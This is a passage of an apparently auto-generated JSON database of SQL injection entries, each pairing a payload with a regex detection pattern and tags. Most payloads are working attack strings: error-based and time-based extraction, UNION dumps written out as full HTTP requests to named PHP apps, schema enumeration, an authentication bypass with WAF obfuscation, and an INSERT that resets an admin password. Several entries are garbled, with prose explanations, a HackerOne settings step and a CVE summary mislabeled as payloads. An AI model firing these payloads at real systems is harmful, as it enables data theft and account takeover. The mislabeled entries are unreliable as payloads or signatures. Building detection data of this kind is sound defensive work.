      "payload": "EXTRACTVALUE\tAND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "EXTRACTVALUE\\\tAND\\ EXTRACTVALUE\\(1337,CONCAT\\('\\.','\\~',\\(SELECT\\ version\\(\\)\\),'\\~'\\)\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Enumerating Table Name AND (SELECT lengt [8d0ab4b3]",
      "payload": "Enumerating Table Name\tAND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Enumerating\\ Table\\ Name\\\tAND\\ \\(SELECT\\ length\\(tbl_name\\)\\ FROM\\ sqlite_master\\ WHERE\\ type='table'\\ AND\\ tbl_name\\ NOT\\ LIKE\\ 'sqlite_%'\\ LIMIT\\ 1\\ OFFSET\\ 0\\)=table_name_length_number",
      "tags": [
        "sqlite"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Examples: /*!12345UNION*/, /*!31337SELEC [7805e705]",
      "payload": "Examples: /*!12345UNION*/, /*!31337SELECT*/",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Examples:\\ /\\*!12345UNION\\*/,\\ /\\*!31337SELECT\\*/",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Extract Column Name SELECT sql FROM sqli [6ef2e12f]",
      "payload": "Extract Column Name\tSELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Extract\\ Column\\ Name\\\tSELECT\\ sql\\ FROM\\ sqlite_master\\ WHERE\\ type!='meta'\\ AND\\ sql\\ NOT\\ NULL\\ AND\\ name\\ ='table_name'",
      "tags": [
        "sqlite"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Extract Columns Name Without Information [80565ce4]",
      "payload": "Extract Columns Name Without Information_Schema",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Extract\\ Columns\\ Name\\ Without\\ Information_Schema",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Extract Database With Information_Schema [56e3e98d]",
      "payload": "Extract Database With Information_Schema",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Extract\\ Database\\ With\\ Information_Schema",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Extract Database With Information_schema [8494c437]",
      "payload": "Extract Database With Information_schema",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Extract\\ Database\\ With\\ Information_schema",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Extract Info AND (SELECT hex(substr(tbl_ [3a62b23f]",
      "payload": "Extract Info\tAND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Extract\\ Info\\\tAND\\ \\(SELECT\\ hex\\(substr\\(tbl_name,1,1\\)\\)\\ FROM\\ sqlite_master\\ WHERE\\ type='table'\\ AND\\ tbl_name\\ NOT\\ LIKE\\ 'sqlite_%'\\ LIMIT\\ 1\\ OFFSET\\ 0\\)\\ >\\ HEX\\('some_char'\\)",
      "tags": [
        "sqlite"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Extract Info (order by) CASE WHEN (SELEC [500fe1e3]",
      "payload": "Extract Info (order by)\tCASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Extract\\ Info\\ \\(order\\ by\\)\\\tCASE\\ WHEN\\ \\(SELECT\\ hex\\(substr\\(sql,1,1\\)\\)\\ FROM\\ sqlite_master\\ WHERE\\ type='table'\\ AND\\ tbl_name\\ NOT\\ LIKE\\ 'sqlite_%'\\ LIMIT\\ 1\\ OFFSET\\ 0\\)\\ =\\ HEX\\('some_char'\\)\\ THEN\\ <order_element_1>\\ ELSE\\ <order_element_2>\\ END",
      "tags": [
        "order-by",
        "sqlite"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Extract Table Name SELECT group_concat(t [0531feab]",
      "payload": "Extract Table Name\tSELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Extract\\ Table\\ Name\\\tSELECT\\ group_concat\\(tbl_name\\)\\ FROM\\ sqlite_master\\ WHERE\\ type='table'\\ and\\ tbl_name\\ NOT\\ like\\ 'sqlite_%'",
      "tags": [
        "sqlite"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI FALSE: if @@version starts with a 4: [f7236f93]",
      "payload": "FALSE: if @@version starts with a 4:",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "FALSE:\\ if\\ @@version\\ starts\\ with\\ a\\ 4:",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI From Active ID go to the feedback sectio [38e3fc5e]",
      "payload": "From Active ID go to the feedback section \"https://hackerone.com/settings/feedback\" and turn on \"Show this blurb on my profile\" On",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "From\\ Active\\ ID\\ go\\ to\\ the\\ feedback\\ section\\ \"https://hackerone\\.com/settings/feedback\"\\ and\\ turn\\ on\\ \"Show\\ this\\ blurb\\ on\\ my\\ profile\"\\ On",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI GET /adms/admin/?page=vehicles/view_tran [90dd6288]",
      "payload": "GET /adms/admin/?page=vehicles/view_transaction&id=5%27+and+false+union+select+1,2,3,4,5,6,7,8,9,database(),version(),12,13,user()--+- HTTP/1.1\nHost: localhost\nsec-ch-ua: \"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=c1ig2qf0q44toal7cqbqvikli5\nConnection: close",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "GET\\ /adms/admin/\\?page=vehicles/view_transaction\\&id=5%27\\+and\\+false\\+union\\+select\\+1,2,3,4,5,6,7,8,9,database\\(\\),version\\(\\),12,13,user\\(\\)\\-\\-\\+\\-\\ HTTP/1\\.1\\\nHost:\\ localhost\\\nsec\\-ch\\-ua:\\ \"Chromium\";v=\"109\",\\ \"Not_A\\ Brand\";v=\"99\"\\\nsec\\-ch\\-ua\\-mobile:\\ \\?0\\\nsec\\-ch\\-ua\\-platform:\\ \"Windows\"\\\nUpgrade\\-Insecure\\-Requests:\\ 1\\\nUser\\-Agent:\\ Mozilla/5\\.0\\ \\(Windows\\ NT\\ 10\\.0;\\ Win64;\\ x64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/109\\.0\\.5414\\.75\\ Safari/537\\.36\\\nAccept:\\ text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/avif,image/webp,image/apng,\\*/\\*;q=0\\.8,application/signed\\-exchange;v=b3;q=0\\.9\\\nSec\\-Fetch\\-Site:\\ none\\\nSec\\-Fetch\\-Mode:\\ navigate\\\nSec\\-Fetch\\-User:\\ \\?1\\\nSec\\-Fetch\\-Dest:\\ document\\\nAccept\\-Encoding:\\ gzip,\\ deflate\\\nAccept\\-Language:\\ en\\-US,en;q=0\\.9\\\nCookie:\\ PHPSESSID=c1ig2qf0q44toal7cqbqvikli5\\\nConnection:\\ close",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI GET /php-music/classes/Master.php?f=get_ [0c2ab7a6]",
      "payload": "GET /php-music/classes/Master.php?f=get_music_details&id=1%27+and+false+union+select+1,version(),@@datadir,4,5,6,7,8,9,10,11--+- HTTP/1.1\nHost: localhost\nCache-Control: max-age=0\nsec-ch-ua: \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Linux\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=a5fd11866a86264db3a68bb1817b2c7f\nConnection: close",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "GET\\ /php\\-music/classes/Master\\.php\\?f=get_music_details\\&id=1%27\\+and\\+false\\+union\\+select\\+1,version\\(\\),@@datadir,4,5,6,7,8,9,10,11\\-\\-\\+\\-\\ HTTP/1\\.1\\\nHost:\\ localhost\\\nCache\\-Control:\\ max\\-age=0\\\nsec\\-ch\\-ua:\\ \"Not\\?A_Brand\";v=\"8\",\\ \"Chromium\";v=\"108\"\\\nsec\\-ch\\-ua\\-mobile:\\ \\?0\\\nsec\\-ch\\-ua\\-platform:\\ \"Linux\"\\\nUpgrade\\-Insecure\\-Requests:\\ 1\\\nUser\\-Agent:\\ Mozilla/5\\.0\\ \\(Windows\\ NT\\ 10\\.0;\\ Win64;\\ x64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/108\\.0\\.5359\\.125\\ Safari/537\\.36\\\nAccept:\\ text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/avif,image/webp,image/apng,\\*/\\*;q=0\\.8,application/signed\\-exchange;v=b3;q=0\\.9\\\nSec\\-Fetch\\-Site:\\ none\\\nSec\\-Fetch\\-Mode:\\ navigate\\\nSec\\-Fetch\\-User:\\ \\?1\\\nSec\\-Fetch\\-Dest:\\ document\\\nAccept\\-Encoding:\\ gzip,\\ deflate\\\nAccept\\-Language:\\ en\\-US,en;q=0\\.9\\\nCookie:\\ PHPSESSID=a5fd11866a86264db3a68bb1817b2c7f\\\nConnection:\\ close",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI GTID_SUBSET AND GTID_SUBSET(CONCAT('~',( [9a1c1b45]",
      "payload": "GTID_SUBSET\tAND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "GTID_SUBSET\\\tAND\\ GTID_SUBSET\\(CONCAT\\('\\~',\\(SELECT\\ version\\(\\)\\),'\\~'\\),1337\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFO [c906ed76]",
      "payload": "IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "IF\\ 1=1\\ WAITFOR\\ DELAY\\ '0:0:5'\\ ELSE\\ WAITFOR\\ DELAY\\ '0:0:0';",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEE [f6d086e4]",
      "payload": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "IF\\(\\[INFERENCE\\]\\)\\ WAITFOR\\ DELAY\\ '0:0:\\[SLEEPTIME\\]'",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI IN AND 1337 IN (SELECT ('~'+(SELECT @@ve [b67b9364]",
      "payload": "IN\tAND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "IN\\\tAND\\ 1337\\ IN\\ \\(SELECT\\ \\('\\~'\\+\\(SELECT\\ @@version\\)\\+'\\~'\\)\\)\\ \\-\\-\\ \\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) [08b05f6b]",
      "payload": "INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "INFORMATION_SCHEMA\\.PLUGINS\\ GROUP\\ BY\\ x\\)a\\)\\ AND",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) [4598f1db]",
      "payload": "INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Cqhk'='Cqhk",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "INFORMATION_SCHEMA\\.PLUGINS\\ GROUP\\ BY\\ x\\)a\\)\\ AND\\ 'Cqhk'='Cqhk",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) [9f89a930]",
      "payload": "INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sOUa",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "INFORMATION_SCHEMA\\.PLUGINS\\ GROUP\\ BY\\ x\\)a\\)\\-\\-\\ sOUa",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI INFORMATION_SCHEMA.PROCESSLIST is a spec [3aaa3501]",
      "payload": "INFORMATION_SCHEMA.PROCESSLIST is a special table available in MySQL and MariaDB that provides information about active processes and threads within the database server. This table can list all operations that DB is performing at the moment.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "INFORMATION_SCHEMA\\.PROCESSLIST\\ is\\ a\\ special\\ table\\ available\\ in\\ MySQL\\ and\\ MariaDB\\ that\\ provides\\ information\\ about\\ active\\ processes\\ and\\ threads\\ within\\ the\\ database\\ server\\.\\ This\\ table\\ can\\ list\\ all\\ operations\\ that\\ DB\\ is\\ performing\\ at\\ the\\ moment\\.",
      "tags": [
        "enumeration",
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI INSERT INTO users (email, password) VALU [6388beeb]",
      "payload": "INSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"BCRYPT_HASH\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" -- \", \"BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT\");",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "INSERT\\ INTO\\ users\\ \\(email,\\ password\\)\\ VALUES\\ \\(\"attacker_dummy@example\\.com\",\\ \"BCRYPT_HASH\"\\),\\ \\(\"admin@example\\.com\",\\ \"P@ssw0rd\"\\)\\ ON\\ DUPLICATE\\ KEY\\ UPDATE\\ password=\"P@ssw0rd\"\\ \\-\\-\\ \",\\ \"BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT\"\\);",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI In MYSQL \"admin\" and \"admin\" are the sam [14925241]",
      "payload": "In MYSQL \"admin\" and \"admin\" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "In\\ MYSQL\\ \"admin\"\\ and\\ \"admin\"\\ are\\ the\\ same\\.\\ If\\ the\\ username\\ column\\ in\\ the\\ database\\ has\\ a\\ character\\-limit\\ the\\ rest\\ of\\ the\\ characters\\ are\\ truncated\\.\\ So\\ if\\ the\\ database\\ has\\ a\\ column\\-limit\\ of\\ 20\\ characters\\ and\\ we\\ input\\ a\\ string\\ with\\ 21\\ characters\\ the\\ last\\ 1\\ character\\ will\\ be\\ removed\\.",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI In a time-based blind SQL injection atta [0be18237]",
      "payload": "In a time-based blind SQL injection attack, an attacker injects a payload that uses WAITFOR DELAY to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "In\\ a\\ time\\-based\\ blind\\ SQL\\ injection\\ attack,\\ an\\ attacker\\ injects\\ a\\ payload\\ that\\ uses\\ WAITFOR\\ DELAY\\ to\\ make\\ the\\ database\\ pause\\ for\\ a\\ certain\\ period\\.\\ The\\ attacker\\ then\\ observes\\ the\\ response\\ time\\ to\\ infer\\ whether\\ the\\ injected\\ payload\\ executed\\ successfully\\ or\\ not\\.",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI In sqlmap use 'phone', 'email', 'deptTyp [0071a953]",
      "payload": "In sqlmap use 'phone', 'email', 'deptType' or 'name' parameter to dump 'department' database.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "In\\ sqlmap\\ use\\ 'phone',\\ 'email',\\ 'deptType'\\ or\\ 'name'\\ parameter\\ to\\ dump\\ 'department'\\ database\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI In the same way, the common payload to b [02311a84]",
      "payload": "In the same way, the common payload to bypass authentication ' or ''=' is equivalent to ' or 1.e('')=' and 1' or 1.e(1) or '1'='1. This technique can be used to obfuscate queries to bypass WAF, for example: 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "In\\ the\\ same\\ way,\\ the\\ common\\ payload\\ to\\ bypass\\ authentication\\ '\\ or\\ ''='\\ is\\ equivalent\\ to\\ '\\ or\\ 1\\.e\\(''\\)='\\ and\\ 1'\\ or\\ 1\\.e\\(1\\)\\ or\\ '1'='1\\.\\ This\\ technique\\ can\\ be\\ used\\ to\\ obfuscate\\ queries\\ to\\ bypass\\ WAF,\\ for\\ example:\\ 1\\.e\\(ascii\\ 1\\.e\\(substring\\(1\\.e\\(select\\ password\\ from\\ users\\ limit\\ 1\\ 1\\.e,1\\ 1\\.e\\)\\ 1\\.e,1\\ 1\\.e,1\\ 1\\.e\\)1\\.e\\)1\\.e\\)\\ =\\ 70\\ or'1'='2",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Intern Record System 1.0 allows SQL Inje [d65e0841]",
      "payload": "Intern Record System 1.0 allows SQL Injection via parameters 'phone', 'email', 'deptType' and 'name' in /intern/controller.php",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Intern\\ Record\\ System\\ 1\\.0\\ allows\\ SQL\\ Injection\\ via\\ parameters\\ 'phone',\\ 'email',\\ 'deptType'\\ and\\ 'name'\\ in\\ /intern/controller\\.php",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI JSON_KEYS AND JSON_KEYS((SELECT CONVERT( [9fe76e08]",
      "payload": "JSON_KEYS\tAND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "JSON_KEYS\\\tAND\\ JSON_KEYS\\(\\(SELECT\\ CONVERT\\(\\(SELECT\\ CONCAT\\('\\~',\\(SELECT\\ version\\(\\)\\),'\\~'\\)\\)\\ USING\\ utf8\\)\\)\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI List Columns SELECT column_name FROM inf [b59962be]",
      "payload": "List Columns\tSELECT column_name FROM information_schema.columns WHERE table_name='data_table'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "List\\ Columns\\\tSELECT\\ column_name\\ FROM\\ information_schema\\.columns\\ WHERE\\ table_name='data_table'",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI List DBA accounts select name from SYSIB [da55568f]",
      "payload": "List DBA accounts\tselect name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "List\\ DBA\\ accounts\\\tselect\\ name\\ from\\ SYSIBM\\.SYSUSERAUTH\\ where\\ SYSADMAUTH\\ =\\ 'Y'\\ or\\ SYSADMAUTH\\ =\\ 'G'",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI List Tables SELECT table_name FROM infor [74af6699]",
      "payload": "List Tables\tSELECT table_name FROM information_schema.tables",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "List\\ Tables\\\tSELECT\\ table_name\\ FROM\\ information_schema\\.tables",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI List Tables SELECT table_name FROM infor [2ad4aa96]",
      "payload": "List Tables\tSELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "List\\ Tables\\\tSELECT\\ table_name\\ FROM\\ information_schema\\.tables\\ WHERE\\ table_schema='<SCHEMA_NAME>'",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Login: Query like SELECT * FROM Users WH [d8e8ce30]",
      "payload": "Login: Query like SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Login:\\ Query\\ like\\ SELECT\\ \\*\\ FROM\\ Users\\ WHERE\\ username\\ =\\ 'FUZZ1'\\ AND\\ password\\ =\\ 'FUZZ2';",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI MariaDB [dummydb]> SELECT AUTHOR_ID,TITL [662fb399]",
      "payload": "MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "MariaDB\\ \\[dummydb\\]>\\ SELECT\\ AUTHOR_ID,TITLE\\ FROM\\ POSTS\\ WHERE\\ AUTHOR_ID=\\-1\\ UNION\\ SELECT\\ 1,\\(SELECT\\ CONCAT\\(`3`,0X3A,`4`\\)\\ FROM\\ \\(SELECT\\ 1,2,3,4,5,6\\ UNION\\ SELECT\\ \\*\\ FROM\\ USERS\\)A\\ LIMIT\\ 1,1\\);",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Multi-Line Comment /**/ [7afd82e1]",
      "payload": "Multi-Line Comment\t/**/",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Multi\\-Line\\ Comment\\\t/\\*\\*/",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI MySQL 4/5 : BENCHMARK() [10fae614]",
      "payload": "MySQL 4/5 : BENCHMARK()",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "MySQL\\ 4/5\\ :\\ BENCHMARK\\(\\)",
      "tags": [
        "mysql",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI MySQL 5: SLEEP() [513b1173]",
      "payload": "MySQL 5: SLEEP()",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "MySQL\\ 5:\\ SLEEP\\(\\)",
      "tags": [
        "mysql",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI MySQL conditional comments are enclosed  [6b5e66df]",
      "payload": "MySQL conditional comments are enclosed within /*! ... */ and can include a version number to specify the minimum version of MySQL that should execute the contained code. The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the /*!. If the MySQL version is less than the specified number, the code inside the comment will be ignored.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "MySQL\\ conditional\\ comments\\ are\\ enclosed\\ within\\ /\\*!\\ \\.\\.\\.\\ \\*/\\ and\\ can\\ include\\ a\\ version\\ number\\ to\\ specify\\ the\\ minimum\\ version\\ of\\ MySQL\\ that\\ should\\ execute\\ the\\ contained\\ code\\.\\ The\\ code\\ inside\\ this\\ comment\\ will\\ be\\ executed\\ only\\ if\\ the\\ MySQL\\ version\\ is\\ greater\\ than\\ or\\ equal\\ to\\ the\\ number\\ immediately\\ following\\ the\\ /\\*!\\.\\ If\\ the\\ MySQL\\ version\\ is\\ less\\ than\\ the\\ specified\\ number,\\ the\\ code\\ inside\\ the\\ comment\\ will\\ be\\ ignored\\.",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI OR OR 1 GROUP BY CONCAT('~',(SELECT vers [4b5516ec]",
